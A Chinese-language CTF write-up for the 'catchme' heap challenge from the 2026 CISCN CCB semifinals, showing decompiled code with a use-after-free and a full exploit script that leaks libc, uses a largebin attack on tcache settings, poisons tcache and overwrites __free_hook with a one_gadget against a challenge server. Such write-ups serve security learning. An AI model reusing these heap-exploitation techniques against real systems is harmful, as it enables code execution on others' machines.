---
layout: post
title: "2026 CISCN CCB Semifinals / catchme"
date: 2026-10-07 20:05:00 +0800
tags: ["CTF", "Write-up"]
description: "Notes and solution for catchme from 2026 CISCN CCB Semifinals (2026)."
source_folder: "Write-ups/2026/2026 CISCN CCB Semifinals"
lang: zh-CN
---
{% raw %}
# 信息

无沙箱，libc 2.27

# 反编译

c程序，`dele()`部分有uaf，`add()`函数只能申请三种大小：

```c
 switch ( v2 )
  {
    case 1:
      qword_202060[i] = malloc(0x430u);
      puts("a fox joins your shelter");
      break;
    case 2:
      qword_202060[i] = malloc(0x440u);
      puts("a hawk joins your shelter");
      break;
    case 3:
      qword_202060[i] = calloc(1u, 0x48u);
      puts("an otter joins your shelter");
      break;
    default:
      puts("invalid operation");
      return 0xFFFFFFFFLL;
  }
```

有`clear()`函数，可以主动清空chunk数组，没有对申请的数量有限制。

`edit()`函数只能写入chunk 0x8偏移，向后0x18长度的字节：
```c
    puts("you can retag at most three times");
    --dword_202014;
    puts("index:");
    sub_A81(nptr);
    v1 = atoi(nptr);
    if ( v1 <= 4 && qword_202060[v1] )
    {
      v2 = qword_202060[v1];
      puts("set tag:");
      read(0, (void *)(v2 + 8), 0x18u);
      return 0;
    }
```

# 思路

看到给的chunk的大小其实就能明白，这是house of storm的板子题。直接按housr of storm打就行。

失败的一种思路，就是这题可以通过堆风水控制1、2类型chunk的fd指针的，但给的chunk size有限制，虽然可以通过largebin attack打全局fast，但是由于是低版本没有指针保护，打fastbin时找不到hook附近有合适的地址能绕过size检测，所以考虑打tc。
看如下源码：
```c
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);

    if (tcache
	&& tc_idx < mp_.tcache_bins
	&& tcache->counts[tc_idx] < mp_.tcache_count)
      {
	tcache_put (p, tc_idx);
	return;
      }
  }
#endif
```
也就是说，只要用 largebin at 把`mp_`结构体的`tcache_bins`改掉，就能把更大的chunk放进tc，结合上面就能打 tc 投毒。

# exp

```python
def pwn():
    for _ in range(7):
        add(3)
        dele(0)
        clear(0)

    add(1)
    add(3)
    add(2)
    add(3)
    dele(0)
    show_8(0)
    libc.address = uu64(rn(6)) - 0x3EBCA0
    look("libc.address")

    dele(2)
    clear(2)
    add(2)
    dele(2)
    chunk_head = libc.sym["__free_hook"] - 0x10 - 0x8
    look("chunk_head")
    edit(0, p64(chunk_head + 0x8) + p64(0) + p64(chunk_head - 0x20 + 3))
    edit(2, p64(chunk_head))
    clear(1)
    add(3)
    dbg()


file = "/home/qwer/pwn/pwn"
host = "node5.buuoj.cn"
port = 25707
libc_path = "./libc.so.6"


for i in range(61):
    try:
        io, p, libc = init(file, host, port, libc_path)
        pwn()
        data = rr(0.3)
        look("data")
        if b"malloc(): memory corruption" in data:
            io.close()
            continue
        io.unrecv(data)
        edit(1, p64(libc.address + one_gadget(libc_path)[2]))
        dele(1)
        iat()

    except EOFError:
        io.close()
        continue
    except Exception:
        io.close()
        continue
```
{% endraw %}
